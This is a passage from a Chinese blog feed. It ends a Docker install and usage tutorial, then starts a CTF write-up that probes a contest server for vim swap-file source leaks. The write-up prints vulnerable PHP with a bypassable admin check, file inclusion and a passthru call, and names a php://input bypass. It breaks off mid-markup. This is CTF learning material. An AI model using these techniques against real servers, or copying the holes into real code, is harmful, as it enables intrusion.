-c apt-get install -y -qq --no-install-recommends docker-ce &amp;gt;/dev/null</span><br><span class="line">+ sh -c docker version</span><br><span class="line">Client:</span><br><span class="line"> Version:   18.01.0-ce</span><br><span class="line"> API version:   1.35</span><br><span class="line"> Go version:    go1.9.2</span><br><span class="line"> Git commit:    03596f5</span><br><span class="line"> Built: Wed Jan 10 20:11:05 2018</span><br><span class="line"> OS/Arch:   linux/amd64</span><br><span class="line"> Experimental:  false</span><br><span class="line"> Orchestrator:  swarm</span><br><span class="line"></span><br><span class="line">Server:</span><br><span class="line"> Engine:</span><br><span class="line">  Version:  18.01.0-ce</span><br><span class="line">  API version:  1.35 (minimum version 1.12)</span><br><span class="line">  Go version:   go1.9.2</span><br><span class="line">  Git commit:   03596f5</span><br><span class="line">  Built:    Wed Jan 10 20:09:37 2018</span><br><span class="line">  OS/Arch:  linux/amd64</span><br><span class="line">  Experimental: false</span><br><span class="line">If you would like to use Docker as a non-root user, you should now consider</span><br><span class="line">adding your user to the &quot;docker&quot; group with something like:</span><br><span class="line"></span><br><span class="line">  sudo usermod -aG docker your-user</span><br><span class="line"></span><br><span class="line">Remember that you will have to log out and back in for this to take effect!</span><br><span class="line"></span><br><span class="line">WARNING: Adding a user to the &quot;docker&quot; group will grant the ability to run</span><br><span class="line">         containers which can be used to obtain root privileges on the</span><br><span class="line">         docker host.</span><br><span class="line">         Refer to https://docs.docker.com/engine/security/security/#docker-daemon-attack-surface</span><br><span class="line">         for more information.</span><br></pre></td></tr></table></figure><p>装好后有提示,如果要用非root用户直接运行docker时,需要执行sudo usermod -aG docker blacsheep,然后重新登录,否则会有问题,然后我们后台启动一下docker</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@blacsheep-myubuntu:/etc/docker# service docker start</span><br></pre></td></tr></table></figure><p>至于镜像加速我是直接按教程里面来弄的...在/etc/docker/daemon.json里面写一个</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  &quot;registry-mirrors&quot;: [&quot;http://hub-mirror.c.163.com&quot;]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>安装就至此结束..</p><h3 id="docker的使用">docker的使用</h3><h5 id="hello-world">hello world</h5><p>感觉一个栗子就让我意识到了docker的作用.... 教程开始一句话:Docker 允许你在容器内运行应用程序， 使用 docker run 命令来在容器内运行一个应用程序。 输出hello world</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">root@blacsheep-myubuntu:/etc/docker# docker run ubuntu:16.10 /bin/echo &quot;hello world&quot;</span><br><span class="line">Unable to find image &#x27;ubuntu:16.10&#x27; locally</span><br><span class="line">16.10: Pulling from library/ubuntu</span><br><span class="line">dca7be20e546: Pull complete </span><br><span class="line">40bca54f5968: Pull complete </span><br><span class="line">61464f23390e: Pull complete </span><br><span class="line">d99f0bcd5dc8: Pull complete </span><br><span class="line">120db6f90955: Pull complete </span><br><span class="line">Digest: sha256:9e39bf1a0bf29dd1bf28211e3b870134d080b5d2b6072b47c5970d13e5725fb6</span><br><span class="line">Status: Downloaded newer image for ubuntu:16.10</span><br><span class="line">hello world</span><br></pre></td></tr></table></figure><p>参数解析: - docker:docker的二进制文件执行 - run:与前面的docker组合来运行一个容器 - ubuntu:16.10:docker首先本地查找镜像是否存在,如果不存在docker就会从镜像仓库docker hub里面下载公共镜像 - /bin/echo "hello world":在启动的容器里面执行的命令 完整的意思就是docker以ubuntu16.10镜像创建一个容器,容器里面运行bin/echo "hello world",然后输出结果</p><h5 id="运行交互式容器">运行交互式容器</h5><p>通过运行docker的两个参数可以实现和docker容器的交互</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@blacsheep-myubuntu:/etc/docker# docker run -i -t ubuntu:16.10 /bin/bash</span><br><span class="line">root@34541a7cf8a3:/# </span><br></pre></td></tr></table></figure><p>参数解析: - -t:在容器里指定一个终端或伪终端 - -i:允许你对容器内的标准输入进行交互 就像上面那个,我们就进入了一个新的ubuntu16.10的容器,可以ls来查看新的系统的目录,cat /proc/version来看系统的版本,然后退出的话可以用exit或者ctrl+d</p><h5 id="后台模式">后台模式</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@blacsheep-myubuntu:/etc/docker# docker run -d ubuntu:16.10 /bin/sh -c &quot;while true; do echo hello world; sleep 1; done&quot;</span><br><span class="line">a1ccf7c2927e7032498e1b7ba3a172b0110ced4b0418f10c3e156d0d235627f1</span><br></pre></td></tr></table></figure><p>这里解释一下-d参数,-d是表示后台运行容器,同时返回容器id 这里执行完了没有hello world显示,但是我们运行docker ps</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@blacsheep-myubuntu:/etc/docker# docker ps</span><br><span class="line">CONTAINER ID        IMAGE               COMMAND                  CREATED              STATUS              PORTS               NAMES</span><br><span class="line">a1ccf7c2927e        ubuntu:16.10        &quot;/bin/sh -c &#x27;while t…&quot;   About a minute ago   Up About a minute                       agitated_northcutt</span><br></pre></td></tr></table></figure><p>然后docker logs a1ccf7c2927e 来查看 <img src="/images/2018/01/docker-1.png" alt="blacsheep" /> 发现其实容器是在后台运行的</p><h5 id="停止容器">停止容器</h5><p>为了停止我们刚刚的命令,我们运行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">root@blacsheep-myubuntu:/etc/docker# docker stop a1ccf7c2927e7032498e1b7ba3a172b0110ced4b0418f10c3e156d0d235627f1 </span><br><span class="line">a1ccf7c2927e7032498e1b7ba3a172b0110ced4b0418f10c3e156d0d235627f1</span><br><span class="line">root@blacsheep-myubuntu:/etc/docker# docker ps</span><br><span class="line">CONTAINER ID        IMAGE               COMMAND             CREATED             STATUS              PORTS               NAMES</span><br><span class="line">root@blacsheep-myubuntu:/etc/docker# </span><br></pre></td></tr></table></figure><p>下面的docker ps证明已经成功停止了后台进程.</p><h3 id="小结">小结</h3><p>这里发觉docker可以在一个新的容器里面完成各种需要的操作,对于环境的配置会简单很多很多。这是我个人目前的理解吧,这里主要是学习一下docker的操作,比较简单,后续再慢慢深入学习吧....</p>]]></content>
      
      
      <categories>
          
          <category> web篇 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>赛博地球杯(不会部分</title>
      <link href="/2018/01/25/%E8%B5%9B%E5%8D%9A%E5%9C%B0%E7%90%83%E6%9D%AF%E4%B8%8D%E4%BC%9A%E9%83%A8%E5%88%86/"/>
      <url>/2018/01/25/%E8%B5%9B%E5%8D%9A%E5%9C%B0%E7%90%83%E6%9D%AF%E4%B8%8D%E4%BC%9A%E9%83%A8%E5%88%86/</url>
      
        <content type="html"><![CDATA[<h4 id="工控云管理系统客服中心期待您的反馈">工控云管理系统客服中心期待您的反馈</h4><h5 id="工控云管理系统客服中心存在漏洞flag就在flagflagflagflagflagflagflag.php文件里面-http47.104.188.22620001-请找到这个隐藏的文件swp不不不再找找">工控云管理系统客服中心存在漏洞，flag就在flag/flag/flag/flag/flag/flag/flag.php文件里面 http://47.104.188.226:20001 请找到这个隐藏的文件，swp？不不不。。。再找找。。</h5><p>源码泄漏,以后拿到题目没思路先把可能泄漏源码的地方试一遍再说</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//47.104.188.226:20001/.index.php.swp</span></span><br><span class="line">http:<span class="comment">//47.104.188.226:20001/.index.php.swo</span></span><br><span class="line">http:<span class="comment">//47.104.188.226:20001/.index.php.swn</span></span><br></pre></td></tr></table></figure><p>这里就是源码泄漏,然后拿到index的源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;open_basedir&#x27;</span>, <span class="string">&#x27;/var/www/html&#x27;</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">autoload</span>(<span class="params"><span class="variable">$page</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">stripos</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;QUERY_STRING&#x27;</span>], <span class="string">&#x27;flag&#x27;</span>) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">      <span class="keyword">die</span>(<span class="string">&#x27;no flag flag flag flag !&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">stripos</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;QUERY_STRING&#x27;</span>], <span class="string">&#x27;uploaded&#x27;</span>) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">      <span class="keyword">die</span>(<span class="string">&#x27;no uploaded uploaded uploaded uploaded !&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">stripos</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;QUERY_STRING&#x27;</span>], <span class="string">&#x27;://f&#x27;</span>) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">      <span class="keyword">die</span>(<span class="string">&#x27;no ://f ://f ://f&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">stripos</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;QUERY_STRING&#x27;</span>], <span class="string">&#x27;ata&#x27;</span>) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">      <span class="keyword">die</span>(<span class="string">&#x27;no ata ata ata&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">stripos</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;QUERY_STRING&#x27;</span>], <span class="string">&#x27;0&#x27;</span>) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">      <span class="keyword">die</span>(<span class="string">&#x27;no 0 0 0&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">file_exists</span>(<span class="string">&quot;./includes/<span class="subst">$page</span>.php&quot;</span>)) &#123;</span><br><span class="line">        <span class="keyword">include</span> <span class="string">&quot;./includes/<span class="subst">$page</span>.php&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">elseif</span>(<span class="title function_ invoke__">file_exists</span>(<span class="string">&quot;./includes/<span class="subst">$page</span>&quot;</span>)) &#123;</span><br><span class="line">        <span class="keyword">include</span> <span class="string">&quot;./includes/<span class="subst">$page</span>&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&quot;File is not exit &quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">download</span>(<span class="params"><span class="variable">$adfile</span>, <span class="variable">$file</span></span>)</span>&#123;</span><br><span class="line">  <span class="comment">//Only Administrators can download files .</span></span><br><span class="line">      <span class="variable">$cert</span> = <span class="string">&#x27;N&#x27;</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$adfile</span>) &amp;&amp; <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$adfile</span>, <span class="string">&#x27;r&#x27;</span>) === <span class="string">&#x27;Yeah Everything Will Be Ok My Boss&#x27;</span>) &#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&quot;Welcome ! You Are Administrator !&quot;</span>;</span><br><span class="line">      <span class="variable">$cert</span> = <span class="string">&#x27;Y&#x27;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&quot;error1&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$cert</span> === <span class="string">&#x27;Y&#x27;</span>)&#123;</span><br><span class="line">      <span class="keyword">if</span> (<span class="title function_ invoke__">stripos</span>(<span class="variable">$file</span>, <span class="string">&#x27;file_list&#x27;</span>) != <span class="literal">false</span>) <span class="keyword">die</span>(<span class="string">&#x27;error4&#x27;</span>);</span><br><span class="line">      <span class="keyword">if</span> (<span class="title function_ invoke__">stripos</span>(<span class="variable">$file</span>, <span class="string">&#x27;file_list&#x27;</span>) &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">      <span class="title function_ invoke__">header</span>(<span class="string">&#x27;Content-Description: File Transfer&#x27;</span>);</span><br><span class="line">      <span class="title function_ invoke__">header</span>(<span class="string">&#x27;Content-Type: application/octet-stream&#x27;</span>);</span><br><span class="line">      <span class="title function_ invoke__">header</span>(<span class="string">&#x27;Content-Disposition: attachment; filename=&#x27;</span>. <span class="title function_ invoke__">basename</span>(<span class="variable">$file</span>));</span><br><span class="line">      <span class="title function_ invoke__">header</span>(<span class="string">&#x27;Content-Transfer-Encoding: binary&#x27;</span>);</span><br><span class="line">      <span class="title function_ invoke__">header</span>(<span class="string">&#x27;Expires: 0&#x27;</span>);</span><br><span class="line">      <span class="title function_ invoke__">header</span>(<span class="string">&#x27;Cache-Control: must-revalidate, post-check=0, pre-check=0&#x27;</span>);</span><br><span class="line">      <span class="title function_ invoke__">header</span>(<span class="string">&#x27;Pragma: public&#x27;</span>);</span><br><span class="line">      <span class="title function_ invoke__">header</span>(<span class="string">&#x27;Content-Length: &#x27;</span> . <span class="title function_ invoke__">filesize</span>(<span class="variable">$file</span>));</span><br><span class="line">      <span class="title function_ invoke__">readfile</span>(<span class="variable">$file</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">      <span class="keyword">die</span>(<span class="string">&#x27;error2&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&#x27;error3&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$page</span> = <span class="string">&#x27;index&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$page</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">stripos</span>(<span class="variable">$page</span>, <span class="string">&#x27;./&#x27;</span>) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">  <span class="keyword">die</span>(<span class="string">&#x27;no ./ ./ ./ ./&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">stripos</span>(<span class="variable">$page</span>, <span class="string">&#x27;://&#x27;</span>) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">  <span class="keyword">die</span>(<span class="string">&#x27;no :// :// ://&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">autoload</span>(<span class="variable">$page</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[admin]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[file])) &#123;</span><br><span class="line">  <span class="keyword">if</span> (<span class="title function_ invoke__">stripos</span>(<span class="variable">$_GET</span>[admin], <span class="string">&#x27;flag&#x27;</span>) &gt; <span class="number">0</span>  <span class="title function_ invoke__">stripos</span>(<span class="variable">$_GET</span>[file], <span class="string">&#x27;flag&#x27;</span>) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;not flag flag flag falg !&#x27;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (<span class="title function_ invoke__">strlen</span>(<span class="variable">$_GET</span>[file]) &gt;= <span class="number">38</span>) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;too long&#x27;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="title function_ invoke__">download</span>(<span class="variable">$_GET</span>[admin], <span class="variable">$_GET</span>[file]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>里面有一个文件下载的函数,只有通过了认证才可以下载,然后认证的部分是</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$adfile</span>) &amp;&amp; <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$adfile</span>, <span class="string">&#x27;r&#x27;</span>) === <span class="string">&#x27;Yeah Everything Will Be Ok My Boss&#x27;</span>) &#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&quot;Welcome ! You Are Administrator !&quot;</span>;</span><br><span class="line">      <span class="variable">$cert</span> = <span class="string">&#x27;Y&#x27;</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>这里绕过直接用php://input就可以了,然后通过file参数来下载upload.php 顺利拿到upload.php的源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">stripos</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;QUERY_STRING&#x27;</span>], <span class="string">&#x27;flag&#x27;</span>) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">      <span class="keyword">die</span>(<span class="string">&#x27;no flag flag flag flag !&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable">$_FILES</span>)) &#123;</span><br><span class="line">    <span class="comment">//properties of the uploaded file</span></span><br><span class="line">    <span class="variable">$name</span>= <span class="variable">$_FILES</span>[<span class="string">&quot;filename&quot;</span>][<span class="string">&quot;name&quot;</span>];</span><br><span class="line">    <span class="variable">$type</span>= <span class="variable">$_FILES</span>[<span class="string">&quot;filename&quot;</span>][<span class="string">&quot;type&quot;</span>];</span><br><span class="line">    <span class="variable">$size</span>= <span class="variable">$_FILES</span>[<span class="string">&quot;filename&quot;</span>][<span class="string">&quot;size&quot;</span>];</span><br><span class="line">    <span class="variable">$temp</span>= <span class="variable">$_FILES</span>[<span class="string">&quot;filename&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>];</span><br><span class="line">    <span class="variable">$error</span>= <span class="variable">$_FILES</span>[<span class="string">&quot;filename&quot;</span>][<span class="string">&quot;error&quot;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">strlen</span>(<span class="variable">$name</span>) &gt;= <span class="number">6</span>) &#123;</span><br><span class="line">      <span class="keyword">die</span>(<span class="string">&#x27;name is too long !&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">stripos</span>(<span class="variable">$name</span>, <span class="string">&#x27;./&#x27;</span>) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">      <span class="keyword">die</span>(<span class="string">&#x27;invalid parameter&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">stripos</span>(<span class="variable">$name</span>, <span class="string">&#x27;php&#x27;</span>) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">      <span class="keyword">die</span>(<span class="string">&#x27;invalid parameter&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">substr</span>(<span class="variable">$name</span>, -<span class="number">3</span>, <span class="number">3</span>) !== <span class="string">&#x27;zip&#x27;</span> &amp;&amp; <span class="title function_ invoke__">substr</span>(<span class="variable">$name</span>, -<span class="number">3</span>, <span class="number">3</span>) !== <span class="string">&#x27;jpg&#x27;</span> &amp;&amp; <span class="title function_ invoke__">substr</span>(<span class="variable">$name</span>, -<span class="number">3</span>, <span class="number">3</span>) !== <span class="string">&#x27;png&#x27;</span>) &#123;</span><br><span class="line">      <span class="keyword">die</span>(<span class="string">&#x27;file can not upload ! &#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$error</span> &gt; <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Error uploading file! code <span class="subst">$error</span>.&quot;</span>);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">       &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$type</span> !== <span class="string">&quot;application/zip&quot;</span>  <span class="variable">$size</span> &gt; <span class="number">400</span>)<span class="comment">//condition for the file</span></span><br><span class="line">        &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Format not allowed or file size too big!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span>(<span class="title function_ invoke__">file_exists</span>(<span class="string">&#x27;includes&#x27;</span>))&#123;</span><br><span class="line">            <span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp</span>, <span class="string">&quot;includes/uploaded/&quot;</span> .<span class="variable">$name</span>);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;Upload complete a!&quot;</span>;</span><br><span class="line">            <span class="title function_ invoke__">shell_exec</span>(<span class="string">&#x27;sh /var/www/html/includes/unzip.sh&#x27;</span>);</span><br><span class="line">          &#125;<span class="keyword">elseif</span>(<span class="title function_ invoke__">file_exists</span>(<span class="string">&#x27;uploaded&#x27;</span>))&#123;</span><br><span class="line">            <span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp</span>, <span class="string">&quot;uploaded/&quot;</span> .<span class="variable">$name</span>);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;Upload complete!&quot;</span>;</span><br><span class="line">            <span class="title function_ invoke__">shell_exec</span>(<span class="string">&#x27;sh /var/www/html/includes/unzip.sh&#x27;</span>);</span><br><span class="line">          &#125;</span><br><span class="line">         &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;step&#x27;</span>]) &amp;&amp; <span class="title function_ invoke__">strlen</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;step&#x27;</span>]) === <span class="number">20</span>) &#123;</span><br><span class="line">      <span class="keyword">if</span> (<span class="title function_ invoke__">stripos</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;step&#x27;</span>], <span class="string">&#x27;lag&#x27;</span>) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;error&#x27;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> (<span class="title function_ invoke__">stripos</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;step&#x27;</span>], <span class="string">&#x27;./&#x27;</span>) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;error&#x27;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> (<span class="title function_ invoke__">stripos</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;step&#x27;</span>], <span class="string">&#x27; &#x27;</span>) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;error&#x27;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> (<span class="title function_ invoke__">stripos</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;step&#x27;</span>], <span class="string">&#x27;/&#x27;</span>) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;error&#x27;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[^\w\d_ -]/si&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;step&#x27;</span>])) &#123;</span><br><span class="line">        <span class="variable">$_GET</span>[<span class="string">&#x27;step&#x27;</span>] = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[^a-zA-Z0-9_ -]/s&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;step&#x27;</span>]);</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;error&#x27;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">        <span class="title function_ invoke__">passthru</span>(<span class="string">&#x27;cat &#x27;</span> . <span class="string">&#x27;uploaded/&#x27;</span> . <span class="variable">$_GET</span>[<span class="string">&#x27;step&#x27;</span>]);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">      <span class="keyword">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>看一下源码,balabala一大堆,发现就是可以上传一个zip文件嘛,然后名字不能太长,传上去之后会调用一个unzip.sh,访问一下http://47.104.188.226:20001/includes/unzip.sh 拿到了unzip.sh的源码</p><figure class="highlight php"><table><tr><td 